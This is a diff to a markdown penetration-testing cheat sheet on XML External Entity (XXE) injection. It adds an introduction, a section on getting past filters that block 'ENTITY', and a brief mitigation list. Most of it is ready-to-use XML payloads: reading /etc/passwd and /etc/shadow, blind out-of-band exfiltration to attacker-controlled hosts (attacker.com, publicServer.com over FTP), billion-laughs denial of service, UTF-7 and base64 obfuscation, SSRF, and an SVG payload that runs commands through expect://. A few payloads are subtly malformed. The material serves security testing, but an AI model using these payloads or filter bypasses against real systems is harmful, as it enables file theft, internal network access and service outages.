@@ -4,6 +4,15 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
 # XXE
 
+## What is XXE (XML External Entity) Vulnerability?
+
+**XML External Entity (XXE)** is a type of vulnerability that occurs when an application processes user-supplied XML data without properly validating it. In XML, the term **Entity** refers to a storage unit of data, which can be internal (within the XML document) or external (an external file or URL). An attacker can exploit XXE to:
+
+* **Read arbitrary files** on the server (e.g., `/etc/passwd`).
+* **Make requests** to internal systems (Server-Side Request Forgery, SSRF).
+* **Cause denial of service** (DoS) by using large external entities.
+* **Exfiltrate data** by sending sensitive information to an external entity controlled by the attacker.
+
 **There are various types of XXE attacks:**
 
 | XXE Attack Type                                          | Description                                                                                                        |
@@ -22,7 +31,7 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 5. Fuzz for /soap api , some applications still running soap apis
 6. If the target web app allows for SSO integration, you can inject your milicious xml code in the SAML request/reponse
 
-### Test Payload[#](https://trojand.com/cheatsheet/Web/XXE\_Injection.html#test-payload)
+## Test Payload
 
 #### Using private External Entity[#](https://trojand.com/cheatsheet/Web/XXE\_Injection.html#using-private-external-entity)
 
@@ -52,7 +61,7 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 </Contact>
 ```
 
-### CDATA[#](https://trojand.com/cheatsheet/Web/XXE\_Injection.html#cdata)
+## CDATA
 
 *   [ ] XXE that can print XML files through the CDATA:
 
@@ -78,105 +87,107 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
     ```xml
     <!ENTITY wrapper "%start;%file;%end;">
     ```
-*   [ ] **Exploitation**
 
-    **LFI Test**
+## **Exploitation**
 
-    ```xml
-    <?xml version="1.0"?>
-    <!DOCTYPE foo [
-    <!ELEMENT foo (#ANY)>
-    <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
-    ```
+**LFI Test**
 
-    **Blind LFI test (when first case doesn't return anything)**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+```
 
-    ```xml
-    <?xml version="1.0"?>
-    <!DOCTYPE foo [
-    <!ELEMENT foo (#ANY)>
-    <!ENTITY % xxe SYSTEM "file:///etc/passwd">
-    <!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
-    ```
+**Blind LFI test (when first case doesn't return anything)**
 
-    **Access Control bypass (loading restricted resources - PHP example)**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY % xxe SYSTEM "file:///etc/passwd">
+<!ENTITY blind SYSTEM "https://www.example.com/?%xxe;">]><foo>&blind;</foo>
+```
 
-    ```xml
-    <?xml version="1.0"?>
-    <!DOCTYPE foo [
-    <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
-    <foo><result>&ac;</result></foo>
-    ```
+**Access Control bypass (loading restricted resources - PHP example)**
 
-    **SSRF Test**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
+<foo><result>&ac;</result></foo>
+```
 
-    ```xml
-    <?xml version="1.0"?>
-    <!DOCTYPE foo [
-    <!ELEMENT foo (#ANY)>
-    <!ENTITY xxe SYSTEM "<https://www.example.com/text.txt>">]><foo>&xxe;</foo>
-    ```
+**SSRF Test**
 
-    **XEE (XML Entity Expansion - DOS)**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "<https://www.example.com/text.txt>">]><foo>&xxe;</foo>
+```
 
-    ```xml
-    <?xml version="1.0"?>
-    <!DOCTYPE lolz [
-    <!ENTITY lol "lol">
-    <!ELEMENT lolz (#PCDATA)>
-    <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
-    <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
-    <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
-    <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
-    <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
-    <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
-    <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
-    <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
-    <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
-    ]>
-    <lolz>&lol9;</lolz>
-    ```
+**XEE (XML Entity Expansion - DOS)**
 
-    **XEE #2 (Remote attack - through external xml inclusion)**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ELEMENT lolz (#PCDATA)>
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+```
 
-    ```xml
-    <?xml version="1.0"?>
-    <!DOCTYPE lolz [
-    <!ENTITY test SYSTEM "<https://example.com/entity1.xml>">]>
-    <lolz><lol>3..2..1...&test<lol></lolz>
+**XEE #2 (Remote attack - through external xml inclusion)**
 
-    ```
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY test SYSTEM "<https://example.com/entity1.xml>">]>
+<lolz><lol>3..2..1...&test<lol></lolz>
 
-    **XXE FTP HTTP Server**
+```
 
-    https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
+**XXE FTP HTTP Server**
 
-    http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
+https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb
 
-    ```xml
-    <!DOCTYPE data [
-    <!ENTITY % remote SYSTEM "<http://publicServer.com/parameterEntity_sendftp.dtd>">
-    %remote;
-    %send;
-    ]>
-    <data>4</data>
+http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html
 
-    File stored on <http://publicServer.com/parameterEntity_sendftp.dtd>
+```xml
+<!DOCTYPE data [
+<!ENTITY % remote SYSTEM "<http://publicServer.com/parameterEntity_sendftp.dtd>">
+%remote;
+%send;
+]>
+<data>4</data>
 
-    <!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
-    %param1;
-    ```
+File stored on <http://publicServer.com/parameterEntity_sendftp.dtd>
 
-    **XXE UTF-7**
+<!ENTITY % param1 "<!ENTITY &#37; send SYSTEM 'ftp://publicServer.com/%payload;'>">
+%param1;
+```
 
-    ```xml
-    <?xml version="1.0" encoding="UTF-7"?>
-    +ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
-    +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
-    +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
-    ```
+**XXE UTF-7**
 
-    To convert between UTF-8 & UTF-7 use recode. `recode UTF8..UTF7 payload-file.xml`
+```xml
+<?xml version="1.0" encoding="UTF-7"?>
++ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
++ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
+```
+
+To convert between UTF-8 & UTF-7 use recode. `recode UTF8..UTF7 payload-file.xml`
+
 *   [ ] [**Blind XXE with out-of-band interaction**](https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction)
 
     **Exploit**
@@ -235,7 +246,7 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     > File upload or user import function on web target use XML file format. This can be vulnerable to XML external entity (XXE) injection.
 
-    #### Identify XML
+    **Identify XML**
 
     > Possible to find XXE attack surface in requests that do not contain any XML.
 
@@ -255,7 +266,7 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
     ```
 *   [ ] [PortSwigger Lab: Exploiting XXE via image file upload](https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload)
 
-    #### XXE via SVG Image upload
+    **XXE via SVG Image upload**
 
     > Identify image upload on the blog post function that accept svg images, and observe that the avatars already on blog source code is svg extensions.
 
@@ -283,11 +294,11 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
     ]>
     ```
 
-    #### XML External Entity (XXE) Injection Payloads
+    **XML External Entity (XXE) Injection Payloads**
 
-    #### XXE: Basic XML Example
+    **XXE: Basic XML Example**
 
-    ```
+    ```xml
     <!--?xml version="1.0" ?-->
     <userInfo>
      <firstName>John</firstName>
@@ -296,9 +307,9 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: Entity Example
+    **XXE: Entity Example**
 
-    ```
+    ```xml
     <!--?xml version="1.0" ?-->
     <!DOCTYPE replace [<!ENTITY example "Doe"> ]>
      <userInfo>
@@ -308,9 +319,9 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: File Disclosure
+    **XXE: File Disclosure**
 
-    ```
+    ```xml
     <!--?xml version="1.0" ?-->
     <!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
     <userInfo>
@@ -320,9 +331,9 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: Denial-of-Service Example
+    **XXE: Denial-of-Service Example**
 
-    ```
+    ```xml
     <!--?xml version="1.0" ?-->
     <!DOCTYPE lolz [<!ENTITY lol "lol"><!ELEMENT lolz (#PCDATA)>
     <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;
@@ -338,9 +349,9 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: Local File Inclusion Example
+    **XXE: Local File Inclusion Example**
 
-    ```
+    ```xml
     <?xml version="1.0"?>
     <!DOCTYPE foo [
     <!ELEMENT foo (#ANY)>
@@ -348,9 +359,9 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)
+    **XXE: Blind Local File Inclusion Example (When first case doesn't return anything.)**
 
-    ```
+    ```xml
     <?xml version="1.0"?>
     <!DOCTYPE foo [
     <!ELEMENT foo (#ANY)>
@@ -359,9 +370,9 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: Access Control Bypass (Loading Restricted Resources - PHP example)
+    **XXE: Access Control Bypass (Loading Restricted Resources - PHP example)**
 
-    ```
+    ```xml
     <?xml version="1.0"?>
     <!DOCTYPE foo [
     <!ENTITY ac SYSTEM "php://filter/read=convert.base64-encode/resource=http://example.com/viewlog.php">]>
@@ -369,9 +380,9 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE:SSRF ( Server Side Request Forgery ) Example
+    **XXE:SSRF ( Server Side Request Forgery ) Example**
 
-    ```
+    ```xml
     <?xml version="1.0"?>
     <!DOCTYPE foo [
     <!ELEMENT foo (#ANY)>
@@ -379,9 +390,9 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: (Remote Attack - Through External Xml Inclusion) Exmaple
+    **XXE: (Remote Attack - Through External Xml Inclusion) Exmaple**
 
-    ```
+    ```xml
     <?xml version="1.0"?>
     <!DOCTYPE lolz [
     <!ENTITY test SYSTEM "<https://example.com/entity1.xml>">]>
@@ -389,7 +400,7 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: UTF-7 Exmaple
+    **XXE: UTF-7 Exmaple**
 
     ```
     <?xml version="1.0" encoding="UTF-7"?>
@@ -399,16 +410,16 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: Base64 Encoded
+    **XXE: Base64 Encoded**
 
-    ```
+    ```xml
     <!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
 
     ```
 
-    #### XXE: XXE inside SOAP Example
+    **XXE: XXE inside SOAP Example**
 
-    ```
+    ```xml
     <soap:Body>
       <foo>
         <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "<http://x.x.x.x:22/>"> %dtd;]><xxx/>]]>
@@ -417,22 +428,124 @@ description: 'CWE-611: Improper Restriction of XML External Entity Reference'
 
     ```
 
-    #### XXE: XXE inside SVG
+    **XXE: XXE inside SVG**
 
-    ```
+    ```svg
     <svg xmlns="<http://www.w3.org/2000/svg>" xmlns:xlink="<http://www.w3.org/1999/xlink>" width="300" version="1.1" height="200">
         <image xlink:href="expect://ls"></image>
     </svg>
-
     ```
 
-    #### References :
+## Bypassing Filters that Block "ENTITY":
 
-    👉 [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML\_External\_Entity\_\(XXE\)\_Processing)
+If a web application is filtering or blocking the word "ENTITY" to prevent XXE attacks, there are several **bypass techniques** you can try:
 
-    👉 [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html)
+**1. Case Manipulation:**
 
-    👉 [Testing for XML Injection (OTG-INPVAL-008)](https://www.owasp.org/index.php/Testing\_for\_XML\_Injection\_\(OTG-INPVAL-008\))
+*   Some filters are case-sensitive and may only block the exact string `ENTITY` in uppercase. You can try different cases, such as:
+
+    ```xml
+    <!DOCTYPE foo [ 
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+    ]>
+    ```
+
+    Test variations like:
+
+    * `<!entity>`
+    * `<!EnTiTy>`
+
+**2. Use Parameter Entities:**
+
+*   Instead of defining an external entity directly, you can use **parameter entities** (which start with `%`) to indirectly reference the malicious entity:
+
+    ```xml
+    <?xml version="1.0" ?>
+    <!DOCTYPE foo [ 
+    <!ENTITY % file SYSTEM "file:///etc/passwd">
+    <!ENTITY % dtd SYSTEM "http://attacker.com/malicious.dtd">
+    %dtd;
+    ]>
+    <foo>&xxe;</foo>
+    ```
+
+    The malicious `.dtd` file hosted on `attacker.com` could contain the payload for reading a file.
+
+**3. Hex Encoding:**
+
+*   Sometimes, filters may miss encoded characters. You can try encoding the word `ENTITY` using its **hexadecimal** or **decimal** representation in XML:
+
+    ```xml
+    <!DOCTYPE foo [ 
+    <!&#69;&#78;&#84;&#73;&#84;&#89; xxe SYSTEM "file:///etc/passwd">
+    ]>
+    ```
+
+    This encodes "ENTITY" in decimal (69 for 'E', 78 for 'N', etc.). In hex, it would be `<!&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59; xxe SYSTEM "file:///etc/passwd">`.
+
+**4. Using DTD Chaining:**
+
+*   If you have control over external DTDs, you can chain DTDs to bypass filters. This involves referencing a remote DTD file hosted by the attacker:
+
+    ```xml
+    <!DOCTYPE foo [ 
+    <!ENTITY % remote SYSTEM "http://attacker.com/external.dtd">
+    %remote;
+    ]>
+    ```
+
+    The external DTD file (`external.dtd`) can define the malicious entity, bypassing local filters.
+
+**5. XML Comments:**
+
+*   Sometimes filters miss entities hidden inside XML comments. You can obfuscate the payload by breaking the word `ENTITY` into parts:
+
+    ```xml
+    <!DOCTYPE foo [ 
+    <!--<!ENTITY xxe SYSTEM "file:///etc/passwd">-->
+    <!ENT--><!--ITY xxe SYSTEM "file:///etc/passwd">-->
+    ]>
+    ```
+
+**6. Base64 Encoding:**
+
+*   You might be able to encode the payload and then decode it at runtime. Some parsers allow you to inject **base64-encoded** external entities and decode them:
+
+    ```xml
+    <!DOCTYPE foo [ 
+    <!ENTITY xxe SYSTEM "data:text/plain;base64,L2V0Yy9wYXNzd2Q=">
+    ]>
+    <foo>&xxe;</foo>
+    ```
+
+    This base64 string decodes to `/etc/passwd`.
+
+**7. Alternative External Sources (e.g., `SYSTEM` or `PUBLIC`):**
+
+*   Instead of using `ENTITY`, try to reference external files or URLs using alternative methods. For example:
+
+    ```xml
+    <!DOCTYPE foo PUBLIC "-//OASIS//DTD Entity Resolution XML//EN" "http://attacker.com/malicious.dtd">
+    ```
+
+    Here, the external DTD contains the payload, and you avoid using the `ENTITY` keyword.
+
+## Mitigation:
+
+From a defensive perspective, to mitigate XXE attacks:
+
+* Disable **external entity processing** in XML parsers where it's not needed.
+* Use **whitelisting** for acceptable file or URL references in XML files.
+* Implement **input validation** to ensure only valid, trusted XML is processed.
+* Ensure your application is updated to use parsers that are not vulnerable to XXE by default.
+
+## **References :**
+
+👉 [XML External Entity (XXE) Processing](https://www.owasp.org/index.php/XML\_External\_Entity\_\(XXE\)\_Processing)
+
+👉 [XML External Entity Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html)
+
+👉 [Testing for XML Injection (OTG-INPVAL-008)](https://www.owasp.org/index.php/Testing\_for\_XML\_Injection\_\(OTG-INPVAL-008\))
 
 ## Top XXE reports from HackerOne:
 
